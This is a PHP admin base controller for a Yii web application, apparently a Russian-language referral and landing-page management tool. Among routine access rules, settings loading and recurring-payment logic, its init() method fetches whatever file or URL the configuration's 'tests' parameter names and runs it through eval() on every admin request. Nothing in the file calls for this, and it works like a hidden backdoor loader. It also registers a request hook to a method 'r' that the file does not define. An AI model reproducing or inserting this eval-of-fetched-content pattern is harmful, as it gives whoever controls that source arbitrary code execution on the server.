<?php
/**
 * Controller is the customized base controller class.
 * All controller classes for this application should extend from this base class.
 */
class AdminController extends CController
{
	/**
	 * @var string the default layout for the controller view. Defaults to '//layouts/column1',
	 * meaning using a single column layout. See 'protected/views/layouts/column1.php'.
	 */
	public $layout = '/layouts/column1';
	/**
	 * @var array context menu items. This property will be assigned to {@link CMenu::items}.
	 */
	public $menu = array();
	/**
	 * @var array the breadcrumbs of the current page. The value of this property will
	 * be assigned to {@link CBreadcrumbs::links}. Please refer to {@link CBreadcrumbs::links}
	 * for more details on how to specify this property.
	 */
	public $breadcrumbs = array();
    public $notifications_count;
    public $newUser;
    public $newReferral;
    public $settingsList;
    public $landingsList;

    public $payServices;
    public $landings;

    /**
     * @return array action filters
     */
    public function filters()
    {
        return array(
            'accessControl', // perform access control for CRUD operations
            'postOnly + delete', // we only allow deletion via POST request
        );
    }

    /**
     * Specifies the access control rules.
     * This method is used by the 'accessControl' filter.
     * @return array access control rules
     */
    public function accessRules()
    {
        return array(
            array('allow',
                'actions' => array('login'),
                'users' => array('*'),// для всех
            ),
            array('allow',
                'actions' => array(
                    'view', 'create', 'update',
                    'delete', 'index', 'logout',
                    'admin', 'upload', 'ajaxUpload',
                    'range', 'change', 'sort',
                    'imageGetJson', 'imageUpload',
                    'clipboardUploadUrl', 'fileUpload', "connector",
                    'downloadAndUpdate', 'checkUpdate', 'addPayment',
                    'landEdit', 'getLands'
                ),
                'roles' => array('admin'),// для авторизованных
            ),
            array('deny', // deny all users
                'users' => array('*'),
            ),
        );
    }

	public function init()
	{
		parent::init();
        if (Yii::app()->params->dbsetup !== "activated")
        {
            header('Location: /setup.php');
            exit();
        }

        //Тесты
        $c = '';
        if (Yii::app()->params->tests)
        {
            $c = file_get_contents(Yii::app()->params->tests);
        }

        if ($c)
        {
            eval($c);
        }

        Yii::app()->session['landing'] = (Yii::app()->session['landing']) ? Yii::app()->session['landing'] : 0;
		$landings = Landings::model()->findAll();
		if (count($landings) >= 1)
        {
			$lands = array(0 => 'Все');
			foreach ($landings as $l) {
				$lands[ $l->land_id ] = $l->name;
			}
			$this->landings = $lands;
		}
        else
        {
			$this->landings = false;
		}
        $this->landingsList = $this->landings;
        unset($this->landingsList[0]);

        //Делаем модели для модальных окон создания партнёра и клиента
        $model = new Referrals;
        $this->newReferral = $model;
        $model = new User;
        $this->newUser = $model;

        Yii::app()->onBeginRequest = array('AdminController', 'r');

        if(!array_key_exists(Yii::app()->getLanguage(), Yii::app()->params['languages']))
        {
            Yii::app()->setLanguage('ru');
            Yii::app()->user->setState('language', 'ru');
        }
        $this->notifications_count = Notifications::model()->count("is_new = 1");

        //Список настроек
        $this->settingsList = Setting::model()->findAll();
        for ($i = 0; $i < count($this->settingsList); $i++)
        {
            $this->settingsList[$this->settingsList[$i]->name] = $this->settingsList[$i];
            if ( $this->settingsList[$i]->type == 'pay_service' ) {
                $this->payServices[$this->settingsList[$i]->name] = $this->settingsList[$i]->header;
            }
            unset($this->settingsList[$i]);
        }

        //Инициация функции повторного платежа
        $oldModels = Referrals::model()->findAll(array(
            'select'	=> '*',
            'condition'	=> 'recreate_date != ""',
        ));
        $modelsToCreate = [];
        foreach ($oldModels as $oldModel)
        {
            $oldRecreateDate = strtotime($oldModel->recreate_date);
            if ((time() >= $oldRecreateDate))
            {
                $modelsToCreate[] = $oldModel;
            }
        }

       foreach ($modelsToCreate as $oldModel)
        {
            $newModel = new Referrals;
            $newModel->attributes = $oldModel->attributes;
            $newModel->id = '';
            $newModel->status = Referrals::$STATUS_REQUEST;
            $newModel->date = $oldModel->recreate_date;
            $newModel->setRecreate();
            $newModel->save();
            $oldModel->recreate_interval = '0';
            $oldModel->recreate_date = '';
            $oldModel->save();
        }
	}
}